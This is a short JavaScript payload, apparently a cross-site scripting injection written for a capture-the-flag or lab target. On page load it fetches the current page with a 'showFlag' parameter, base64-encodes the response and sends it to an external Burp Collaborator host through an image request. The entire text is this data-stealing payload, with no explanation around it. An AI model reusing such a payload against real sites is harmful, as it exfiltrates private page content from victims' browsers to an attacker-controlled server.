window.addEventListener('load', function() {
   var xhr = new XMLHttpRequest();
    xhr.open("GET", window.location.pathname+"?showFlag=1", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.onreadystatechange = function() {
        if (this.readyState === XMLHttpRequest.DONE) {
            var data = btoa(xhr.responseText);
            var img = new Image();
            img.src = "http://s5y5botc0mjmekaflgs2n6acn3tthi.burpcollaborator.net/data?"+data;
        }
    }
    xhr.send();
   
   
}, false);
